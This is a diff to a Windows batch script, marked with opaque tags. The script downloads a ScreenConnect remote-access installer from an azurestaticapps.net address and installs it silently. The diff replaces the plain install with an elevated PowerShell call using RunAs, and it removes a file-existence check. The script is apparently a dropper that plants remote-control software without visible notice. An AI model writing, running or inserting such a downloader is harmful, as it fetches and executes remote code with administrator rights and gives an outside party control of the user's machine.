@@ -1,31 +1,21 @@
 @echo off
 REM CDRP7F3A9D2B8C4
 setlocal EnableExtensions
-
-REM ========== EDIT THESE ==========
 set "DOWNLOAD_URL=https://ashy-meadow-058164310.2.azurestaticapps.net/ScreenConnect.ClientSetup.msi"
 set "MSI_FILE=%TEMP%\ScreenConnect.ClientSetup.msi"
-REM ================================
-
 echo Downloading...
 curl -fsSL -o "%MSI_FILE%" "%DOWNLOAD_URL%"
 if errorlevel 1 (
     echo Download failed.
     exit /b 1
 )
-
-if not exist "%MSI_FILE%" (
-    echo MSI file missing after download.
-    exit /b 1
-)
-
-echo Installing silently...
-msiexec /i "%MSI_FILE%" /qn /norestart
+echo Installing...
+powershell -nop -c "exit (Start-Process msiexec -Verb RunAs -Wait -PassThru -ArgumentList '/i \"%MSI_FILE%\" /qn /norestart').ExitCode"
 if errorlevel 1 (
     echo Install failed.
     exit /b 1
 )
-
+echo Install finished.
 endlocal
 exit /b
 REM CDRPEND7F3A9D2
